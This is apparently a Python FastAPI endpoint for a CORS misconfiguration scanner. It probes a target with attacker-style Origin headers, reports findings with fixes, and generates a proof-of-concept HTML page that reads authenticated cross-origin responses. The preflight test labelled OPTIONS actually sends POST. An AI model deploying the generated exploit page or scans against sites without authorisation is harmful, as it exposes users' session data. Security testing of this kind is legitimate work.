import asyncio
import re
from fastapi import APIRouter
from models import CorsReq
from tools.utils import clean_url, http_get, f, ok, err

router = APIRouter(tags=["analysis"])


def generate_cors_exploit_html(target_url: str, origin: str, with_credentials: bool) -> str:
    creds_code = "xhr.withCredentials = true;" if with_credentials else "// xhr.withCredentials = false;"
    return f"""<!DOCTYPE html>
<html>
<head>
  <title>CORS Misconfiguration PoC Exploit</title>
</head>
<body>
  <h2>CORS Data Exfiltration Proof of Concept</h2>
  <p>Target: <code>{target_url}</code></p>
  <p>Exploit Origin: <code>{origin}</code></p>
  <button onclick="stealData()">Execute Exfiltration</button>
  <pre id="output" style="background:#111; color:#0f0; padding:15px; border-radius:5px; margin-top:10px;"></pre>

  <script>
    function stealData() {{
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "{target_url}", true);
      {creds_code}
      xhr.onreadystatechange = function() {{
        if (xhr.readyState === 4) {{
          document.getElementById('output').textContent = 
            "[+] Response Intercepted (Status " + xhr.status + "):\\n" + xhr.responseText.substring(0, 500);
          console.log("[+] Intercepted Data:", xhr.responseText);
        }}
      }};
      xhr.send();
    }}
  </script>
</body>
</html>"""


@router.post("/cors")
async def cors_check(req: CorsReq):
    url = clean_url(req.target)
    host = re.sub(r'^https?://', '', url).split('/')[0].split(':')[0]
    
    test_origins = [
        "https://evil.com",
        "https://attacker.io",
        "null",
        f"https://attacker.{host}",
        f"https://{host}.attacker.com",
        f"https://not{host}",
        "http://localhost:3000",
        "http://127.0.0.1:8080",
    ]
    if req.origin:
        test_origins.insert(0, req.origin.strip())

    findings = []
    records = []
    exploit_html = None
    critical_exploit_found = False

    async def test_single_origin(origin: str):
        nonlocal exploit_html, critical_exploit_found
        
        # Test 1: Simple GET request with Origin
        r = await http_get(url, extra_headers={"Origin": origin})
        acao = r["headers"].get("access-control-allow-origin", "")
        acac = r["headers"].get("access-control-allow-credentials", "")
        
        # Test 2: Preflight OPTIONS request
        opt_r = await http_get(url, method="POST", extra_headers={
            "Origin": origin,
            "Access-Control-Request-Method": "GET",
            "Access-Control-Request-Headers": "X-Requested-With, Authorization"
        })
        opt_acao = opt_r["headers"].get("access-control-allow-origin", "")
        opt_acac = opt_r["headers"].get("access-control-allow-credentials", "")

        effective_acao = acao or opt_acao
        effective_acac = acac or opt_acac
        vuln = False
        sev = "info"

        if effective_acao == "*":
            vuln = True
            sev = "medium"
            findings.append(f(
                "medium",
                "CORS Wildcard Allowed (*)",
                f"Header 'Access-Control-Allow-Origin: *' allows any website to read public API responses.",
                "Restrict origin to trusted specific domains."
            ))
        elif effective_acao == origin:
            vuln = True
            if effective_acac.lower() == "true":
                sev = "critical"
                critical_exploit_found = True
                findings.append(f(
                    "critical",
                    f"CORS Origin Reflection with Credentials ({origin})",
                    f"Server dynamically reflects arbitrary Origin '{origin}' AND permits credentials (cookies/tokens). Allows full authenticated session hijacking and account takeover.",
                    "Never blindly reflect the incoming Origin header when Access-Control-Allow-Credentials is true."
                ))
                if not exploit_html:
                    exploit_html = generate_cors_exploit_html(url, origin, True)
            else:
                sev = "high"
                findings.append(f(
                    "high",
                    f"CORS Reflects Arbitrary Origin ({origin})",
                    f"Server dynamically reflects '{origin}' into Access-Control-Allow-Origin.",
                    "Validate Origin against a strict whitelist before echoing."
                ))
                if not exploit_html:
                    exploit_html = generate_cors_exploit_html(url, origin, False)

        elif origin == "null" and effective_acao == "null":
            vuln = True
            sev = "high"
            findings.append(f(
                "high",
                "CORS Allows 'null' Origin",
                "Sandboxed iframes and local file URIs execute under the 'null' origin and can bypass access controls.",
                "Disallow 'null' in Access-Control-Allow-Origin."
            ))

        records.append({
            "Origin": origin,
            "ACAO Response": effective_acao or "None",
            "Credentials Allowed": "✓ Yes" if effective_acac.lower() == "true" else "No",
            "Preflight Supported": "✓ Yes" if opt_acao else "No",
            "Vulnerability": sev.upper() if vuln else "Secure",
        })

    await asyncio.gather(*[test_single_origin(o) for o in test_origins])

    if not any(r["Vulnerability"] != "Secure" for r in records):
        findings.append(f("pass", "CORS Policy Restrictive", "No insecure origin reflection detected among test vectors."))

    # Remove duplicate findings
    unique_findings = []
    seen_titles = set()
    for f_item in findings:
        if f_item["title"] not in seen_titles:
            seen_titles.add(f_item["title"])
            unique_findings.append(f_item)

    summary_data = {
        "URL": url,
        "Origins Tested": len(test_origins),
        "Vulnerable Origins": sum(1 for r in records if r["Vulnerability"] != "Secure"),
        "Credentials Exploitable": "YES (Critical)" if critical_exploit_found else "No",
    }

    result = {
        "summary": summary_data,
        "findings": unique_findings,
        "records": records,
        "record_columns": ["Origin", "ACAO Response", "Credentials Allowed", "Preflight Supported", "Vulnerability"]
    }

    if exploit_html:
        result["raw"] = exploit_html

    return ok(result)
